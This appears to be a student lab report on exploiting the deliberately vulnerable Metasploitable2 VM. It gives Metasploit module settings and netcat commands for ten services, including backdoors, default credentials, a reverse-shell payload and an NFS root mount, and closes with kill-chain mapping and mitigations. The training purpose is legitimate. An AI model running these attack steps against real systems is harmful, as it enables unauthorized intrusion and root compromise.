# Metasploitable2 Exploitation Report

**Name:** Spendylove Amankwaah
**Index Number:** 7351923
**Date:** September 27, 2026
**Target IP:** 10.10.10.5
**Attacker OS / Tools:** Kali Linux 2026.2, Metasploit Framework 6.4.135-dev, Nmap, Netcat

---

## Reconnaissance Summary

Initial discovery was performed using `nmap -p- -sV -sC 10.10.10.5`. This
revealed multiple vulnerable services including FTP (vsftpd 2.3.4), SMB
(usermap_script), IRC (UnrealIRCd 3.2.8.1), distccd, Java RMI registry,
Apache Tomcat manager, NFS (unrestricted export), VNC (weak password),
PostgreSQL (default credentials), and an Ingreslock backdoor on port 1524.

---

## Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21 (backdoor shell on 6200)
- **Vulnerability:** CVE-2011-2523 (Smiley Face Backdoor)
- **Tool Used:** Manual trigger + `nc` to catch shell
- **Why This Tool:** Seamlessly sends the ':)' string and catches the resulting root shell.
- **Steps:**
  1. Triggered the backdoor via FTP login with ':)' in the username on port 21
  2. nc 10.10.10.5 6200
  3. id / hostname / uname -a
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: sent the malformed username string. Exploitation: the backdoor code path was triggered. C2: caught an interactive root shell on port 6200.
- **Outcome / Impact:** Instant root shell (uid=0(root)).

---

## Exploit 2: Samba usermap_script

- **Service / Port:** SMB / 139
- **Vulnerability:** CVE-2007-2447
- **Tool Used:** exploit/multi/samba/usermap_script
- **Why This Tool:** Automates shell metacharacter injection into the username field.
- **Steps:**
  1. use exploit/multi/samba/usermap_script
  2. set RHOSTS 10.10.10.5
  3. run
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: sent the malicious username to the SMB service. Exploitation: command injection was triggered. C2: command shell session opened as root.
- **Outcome / Impact:** Root shell (uid=0(root)).

---

## Exploit 3: UnrealIRCd 3.2.8.1 Backdoor

- **Service / Port:** IRC / 6667
- **Vulnerability:** Malicious source-code backdoor (2010)
- **Tool Used:** exploit/unix/irc/unreal_ircd_3281_backdoor
- **Why This Tool:** Triggers the specific debug string required by the backdoored software.
- **Steps:**
  1. use exploit/unix/irc/unreal_ircd_3281_backdoor
  2. set RHOSTS 10.10.10.5
  3. set LHOST 10.10.10.3
  4. run
- **Evidence:** evidence/exploit3.png
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: sent the IRC backdoor trigger command. Exploitation: forced the service to execute the payload. C2: Meterpreter session opened as root.
- **Outcome / Impact:** Meterpreter session as root.

---

## Exploit 4: DistCC Command Execution

- **Service / Port:** distccd / 3632
- **Vulnerability:** CVE-2004-2687
- **Tool Used:** exploit/unix/misc/distcc_exec
- **Why This Tool:** Readily exploits the compilation daemon to run arbitrary commands.
- **Steps:**
  1. use exploit/unix/misc/distcc_exec
  2. set RHOSTS 10.10.10.5
  3. set PAYLOAD cmd/unix/reverse_perl
  4. set LHOST 10.10.10.3
  5. set LPORT 4444
  6. run
- **Evidence:** evidence/exploit4.png
- **Cyber Kill Chain Stage(s):** Exploitation, C2
  - Exploitation: sent an execution request straight to the daemon, which accepts and runs arbitrary commands with no prior delivery stage. C2: command shell session opened.
- **Outcome / Impact:** Shell as daemon user (uid=1(daemon)).

---

## Exploit 5: Java RMI Server Insecure Default Configuration

- **Service / Port:** Java RMI / 1099
- **Vulnerability:** Insecure default RMI registry configuration
- **Tool Used:** exploit/multi/misc/java_rmi_server
- **Why This Tool:** The RMI registry has no built-in authentication, so a dedicated module can deliver a payload class and have the server load and execute it directly, rather than needing a separate delivery mechanism.
- **Steps:**
  1. use exploit/multi/misc/java_rmi_server
  2. set RHOSTS 10.10.10.5
  3. set LHOST 10.10.10.3
  4. run
- **Evidence:** evidence/exploit5.png
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: payload JAR sent via a crafted RMI call. Exploitation: the remote class was loaded and executed. C2: Meterpreter sessions opened as root.
- **Outcome / Impact:** Meterpreter session as root.

---

## Exploit 6: Tomcat Manager Default Credentials

- **Service / Port:** Apache Tomcat / 8180
- **Vulnerability:** Default credentials (tomcat:tomcat)
- **Tool Used:** exploit/multi/http/tomcat_mgr_upload
- **Why This Tool:** Automatically packages a payload into a WAR file and deploys it via the manager.
- **Steps:**
  1. use exploit/multi/http/tomcat_mgr_upload
  2. set RHOSTS 10.10.10.5
  3. set RPORT 8180
  4. set HttpUsername tomcat
  5. set HttpPassword tomcat
  6. run
- **Evidence:** evidence/exploit6.png
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: WAR file uploaded via the manager interface. Exploitation: the deployed application triggered code execution. C2: Meterpreter session opened.
- **Outcome / Impact:** Meterpreter session as tomcat55.

---

## Exploit 7: NFS Unrestricted Share

- **Service / Port:** NFS / 2049
- **Vulnerability:** Misconfigured export (/ *)
- **Tool Used:** showmount and mount
- **Why This Tool:** Native OS tools allow direct mounting of the exposed filesystem.
- **Steps:**
  1. showmount -e 10.10.10.5
  2. mkdir /tmp/mnt
  3. sudo mount -t nfs 10.10.10.5:/ /tmp/mnt
  4. ls -la /tmp/mnt
- **Evidence:** evidence/exploit7.png
- **Cyber Kill Chain Stage(s):** Recon, Actions on Objectives
  - Reconnaissance: identified the exposed '/ *' export. Actions on Objectives: gained full read access to the target's root filesystem without needing code execution.
- **Outcome / Impact:** Full read access to the target's entire filesystem.

---

## Exploit 8: VNC Weak Password

- **Service / Port:** VNC / 5900
- **Vulnerability:** Weak default credentials
- **Tool Used:** auxiliary/scanner/vnc/vnc_login
- **Why This Tool:** Metasploit quickly automates VNC login checks.
- **Steps:**
  1. use auxiliary/scanner/vnc/vnc_login
  2. set RHOSTS 10.10.10.5
  3. run
- **Evidence:** evidence/exploit8.png
- **Cyber Kill Chain Stage(s):** Weaponization, Exploitation
  - Weaponization: configured the scanner to sweep for known/weak credentials. Exploitation: successfully authenticated using the discovered password.
- **Outcome / Impact:** Valid VNC credentials found (password: 'password').

---

## Exploit 9: PostgreSQL Default Credentials

- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** Default credentials (postgres:postgres)
- **Tool Used:** exploit/linux/postgres/postgres_payload
- **Why This Tool:** Uploads a shared object to execute OS commands via database queries.
- **Steps:**
  1. use exploit/linux/postgres/postgres_payload
  2. set RHOSTS 10.10.10.5
  3. set LHOST 10.10.10.3
  4. set USERNAME postgres
  5. set PASSWORD postgres
  6. run
- **Evidence:** evidence/exploit9.png
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: shared object uploaded to /tmp on the target. Exploitation: executed via a SQL function call. C2: Meterpreter session opened as postgres.
- **Outcome / Impact:** Meterpreter session as postgres user.

---

## Exploit 10: Ingreslock Bind Shell

- **Service / Port:** Ingreslock / 1524
- **Vulnerability:** Pre-existing root bind shell (open backdoor)
- **Tool Used:** nc (Netcat)
- **Why This Tool:** Directly interacts with the raw TCP socket.
- **Steps:**
  1. nc 10.10.10.5 1524
  2. whoami / id / hostname
- **Evidence:** evidence/exploit10.png
- **Cyber Kill Chain Stage(s):** Delivery, C2
  - Delivery: initiated a direct TCP connection to the listener. C2: interacted with the pre-existing root shell bound to the port.
- **Outcome / Impact:** Instant root shell (uid=0(root)).

---


## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. vsftpd 2.3.4 Backdoor |  |  | ✔ | ✔ |  | ✔ |  |
| 2. Samba usermap_script |  |  | ✔ | ✔ |  | ✔ |  |
| 3. UnrealIRCd 3.2.8.1 Backdoor |  |  | ✔ | ✔ |  | ✔ |  |
| 4. DistCC Command Execution |  |  |  | ✔ |  | ✔ |  |
| 5. Java RMI Server Insecure Default Configuration |  |  | ✔ | ✔ |  | ✔ |  |
| 6. Tomcat Manager Default Credentials |  |  | ✔ | ✔ |  | ✔ |  |
| 7. NFS Unrestricted Share | ✔ |  |  |  |  |  | ✔ |
| 8. VNC Weak Password |  | ✔ |  | ✔ |  |  |  |
| 9. PostgreSQL Default Credentials |  |  | ✔ | ✔ |  | ✔ |  |
| 10. Ingreslock Bind Shell |  |  | ✔ |  |  | ✔ |  |

---

## Lessons Learned / Mitigations

- Disable default/anonymous accounts and default credentials on FTP, VNC,
  Tomcat, and PostgreSQL.
- Patch or remove services with known backdoors (vsftpd 2.3.4, UnrealIRCd
  3.2.8.1) -- verify package integrity/checksums since these were
  supply-chain style backdoors, not simple bugs.
- Restrict NFS shares to specific IP ranges rather than exporting '/ *'
  to any host.
- Disable unnecessary legacy services entirely (distccd, Ingreslock/1524)
  where they serve no production purpose.

